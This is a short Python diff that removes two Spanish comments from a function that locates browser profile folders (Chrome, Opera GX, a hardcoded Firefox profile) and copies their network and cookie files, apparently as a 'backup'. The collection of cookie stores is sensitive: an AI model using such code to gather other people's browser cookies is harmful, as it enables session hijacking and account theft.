@@ -212,7 +212,6 @@ def empaquetar_network(browser="chrome"):
     elif browser == "operagx":
         target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default", "Network")
     elif browser == "firefox":
-        # Usamos directamente la ruta específica del perfil que contiene las cookies
         target_dir = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles", "mipt27ed.default-release")
     else:
         return None
@@ -235,7 +234,7 @@ def empaquetar_network(browser="chrome"):
             try:
 
                 if browser == "firefox" and not item.startswith("cookies.sqlite"):
-                    continue # Comenta esta línea si prefieres respaldar todo el perfil de Firefox
+                    continue
                 
                 if os.path.isdir(source_item):
                     shutil.copytree(source_item, target_item, dirs_exist_ok=True)
